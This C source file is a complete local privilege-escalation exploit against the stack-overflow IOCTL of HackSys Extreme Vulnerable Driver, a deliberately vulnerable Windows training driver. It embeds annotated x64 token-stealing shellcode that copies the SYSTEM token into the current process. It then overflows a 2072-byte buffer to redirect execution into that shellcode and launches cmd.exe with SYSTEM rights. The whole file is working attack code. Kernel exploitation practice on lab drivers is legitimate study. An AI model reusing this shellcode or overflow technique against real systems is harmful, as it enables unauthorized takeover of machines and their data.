#include <windows.h>
#include <stdio.h>

#define IOCTL_STACK_OVERFLOW 0x222003
#define QWORD ULONGLONG

BYTE tokenStealing[120] = {
    0x65, 0x48, 0x8b, 0x14, 0x25, 0x88, 0x01, 0x00, 0x00, // mov rdx, [gs:0x188]              ; $rdx = _KTHREAD
    0x48, 0x8b, 0x82, 0xb8, 0x00, 0x00, 0x00,             // mov rax, [rdx + 0xb8]            ; $rax = _EPROCESS
    0x48, 0x89, 0xc3,                                     // mov rbx, rax                     ; $rbx = _EPROCESS
                                                          // .loop:
    0x48, 0x8b, 0x9b, 0x48, 0x04, 0x00, 0x00,             //     mov rbx, [rbx + 0x448]       ; $rbx = ActiveProcessLinks
    0x48, 0x81, 0xeb, 0x48, 0x04, 0x00, 0x00,             //     sub rbx, 0x448               ; $rbx = _EPROCESS
    0x48, 0x83, 0xbb, 0x40, 0x04, 0x00, 0x00, 0x04,       //     cmp qword [rbx + 0x440], 0x4 ; cmp PID to SYSTEM PID
    0x75, 0xe8,                                           //     jnz .loop                    ; if zf == 0 -> loop
    0x48, 0x8b, 0x8b, 0xb8, 0x04, 0x00, 0x00,             // mov rcx, [rbx + 0x4b8]           ; $rcx = SYSTEM token
    0x80, 0xe1, 0xf0,                                     // and cl, 0xf0                     ; clear _EX_FAST_REF struct
    0x48, 0x89, 0x88, 0xb8, 0x04, 0x00, 0x00,             // mov [rax + 0x4b8], rcx           ; store SYSTEM token in _EPROCESS
    0x66, 0x8b, 0x8a, 0xe4, 0x01, 0x00, 0x00,             // mov cx, [rdx + 0x1e4]            ; $cx = KernelApcDisable
    0x66, 0xff, 0xc1,                                     // inc cx                           ; fix value
    0x66, 0x89, 0x8a, 0xe4, 0x01, 0x00, 0x00,             // mov [rdx + 0x1e4], cx            ; restore value
    0x48, 0x8b, 0x92, 0x90, 0x00, 0x00, 0x00,             // mov rdx, [rdx + 0x90]            ; $rdx = ETHREAD.TrapFrame
    0x48, 0x8b, 0xaa, 0x58, 0x01, 0x00, 0x00,             // mov rbp, [rdx + 0x158]           ; $rbp = ETHREAD.TrapFrame.Rbp
    0x48, 0x8b, 0x8a, 0x68, 0x01, 0x00, 0x00,             // mov rcx, [rdx + 0x168]           ; $rcx = ETHREAD.TrapFrame.Rip
    0x4c, 0x8b, 0x9a, 0x78, 0x01, 0x00, 0x00,             // mov r11, [rdx + 0x178]           ; $r11 = ETHREAD.TrapFrame.EFlags
    0x48, 0x8b, 0xa2, 0x80, 0x01, 0x00, 0x00,             // mov rsp, [rdx + 0x180]           ; $rsp = ETHREAD.TrapFrame.Rsp
    0x31, 0xc0,                                           // xor eax, eax                     ; $eax = STATUS SUCCESS
    0x0f, 0x01, 0xf8,                                     // swapgs                           ; swap gs segment
    0x48, 0x0f, 0x07                                      // o64 sysret                       ; return to usermode
};

int main() {
    HANDLE hDevice = CreateFileA("\\\\.\\HacksysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to get handle: 0x%x\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    LPVOID payload = VirtualAlloc(NULL, 2080, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    LPVOID shellcode = VirtualAlloc(NULL, sizeof(tokenStealing), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    RtlFillMemory(payload, 2072, 'A');
    RtlCopyMemory(shellcode, tokenStealing, sizeof(tokenStealing));

    *((QWORD *) ((BYTE *) payload + 2072)) = (QWORD) shellcode;

    DeviceIoControl(hDevice, IOCTL_STACK_OVERFLOW, payload, 2080, NULL, 0, NULL, NULL);
    system("cmd.exe");

    CloseHandle(hDevice);
    return 0;
}
